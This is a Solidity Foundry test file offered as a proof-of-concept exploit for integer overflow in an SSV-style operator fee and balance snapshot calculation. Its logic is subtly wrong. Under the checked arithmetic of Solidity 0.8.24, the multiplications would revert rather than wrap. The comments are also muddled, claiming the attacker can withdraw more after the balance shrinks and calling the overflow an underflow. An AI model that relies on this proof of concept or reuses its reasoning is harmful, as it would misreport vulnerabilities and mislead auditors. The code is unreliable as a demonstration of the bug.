// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.24;

import "forge-std/Test.sol";

contract IntegerOverflowPoC is Test {

    struct Snapshot {
        uint32 block;
        uint64 index;
        uint64 balance;
    }

    struct Operator {
        address owner;
        Snapshot snapshot;
        uint32 validatorCount;
        uint64 fee;
    }

    function testIntegerOverflowAttack() public {
        // Setup: Create operator with high fee
        Operator memory operator = Operator({
            owner: address(0x123),
            snapshot: Snapshot({
                block: 1000000,     // Old block
                index: 0,
                balance: 1000000000000000000  // 1 SSV initial balance
            }),
            validatorCount: 50,      // 50 validators
            fee: 500000000000000     // 0.5 SSV per block per validator
        });

        // Simulate large block difference (weeks of blocks)
        uint32 currentBlock = 1500000;  // 500k blocks later
        uint32 blockDiff = currentBlock - operator.snapshot.block;

        console.log("Block difference:", blockDiff);
        console.log("Operator fee:", operator.fee);
        console.log("Validator count:", operator.validatorCount);

        // Calculate the overflow
        uint64 blockDiffFee = blockDiff * operator.fee;
        console.log("BlockDiffFee:", blockDiffFee);

        uint64 balanceIncrease = blockDiffFee * operator.validatorCount;
        console.log("Balance increase:", balanceIncrease);

        // Check for overflow
        uint256 expectedIncrease = uint256(blockDiff) * uint256(operator.fee) * uint256(operator.validatorCount);
        console.log("Expected (uint256):", expectedIncrease);
        console.log("Actual (uint64):", balanceIncrease);

        // Demonstrate overflow
        if (expectedIncrease > type(uint64).max) {
            uint64 overflowedValue = uint64(expectedIncrease);
            console.log("OVERFLOW DETECTED!");
            console.log("Expected:", expectedIncrease);
            console.log("Overflowed to:", overflowedValue);
            console.log("Value lost:", expectedIncrease - overflowedValue);
        }
    }

    function testAttackExploitation() public {
        // Attack scenario: Operator with maximum fee waits for optimal block timing

        // Step 1: Register operator with high fee
        uint64 maxFee = type(uint64).max / 1000; // Stay within reasonable bounds initially

        // Step 2: Wait for large block difference (or manipulate via other means)
        uint32 blockDiff = 100000; // 100k blocks = ~2 weeks

        // Step 3: Trigger updateSnapshot via any operator interaction
        uint64 blockDiffFee = blockDiff * maxFee;

        // Step 4: Demonstrate wrap-around to small value
        uint256 expectedBalance = uint256(blockDiffFee) * 10; // 10 validators
        uint64 actualBalance = uint64(expectedBalance);

        console.log("Attack Results:");
        console.log("Expected balance:", expectedBalance);
        console.log("Actual balance (overflowed):", actualBalance);

        // Attacker can now withdraw more than they should be able to
        assertTrue(expectedBalance != actualBalance, "Overflow occurred");
        assertTrue(actualBalance < expectedBalance, "Balance underflowed due to overflow");
    }
}
```

